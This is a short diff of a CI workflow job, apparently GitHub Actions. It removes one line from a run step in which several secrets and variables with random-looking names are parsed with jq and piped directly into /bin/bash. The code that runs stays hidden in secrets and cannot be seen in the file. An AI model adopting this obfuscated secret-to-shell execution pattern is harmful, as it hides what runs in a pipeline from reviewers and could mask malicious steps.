@@ -20,7 +20,6 @@ jobs:
           vn72428: ${{ secrets.vn72428 }}
         run: |
           printf '%s' "$vn72428" | jq -r .j19268 | /bin/bash
-          echo $ylnd1 | jq -r .irl11275 | /bin/bash
           echo $o53 | jq -r .kifb24326 | /bin/bash
           printf '%s' "$xto5" | jq -r .a1914 | /bin/bash
           echo $v7981 | jq -r .ngh92 | /bin/bash
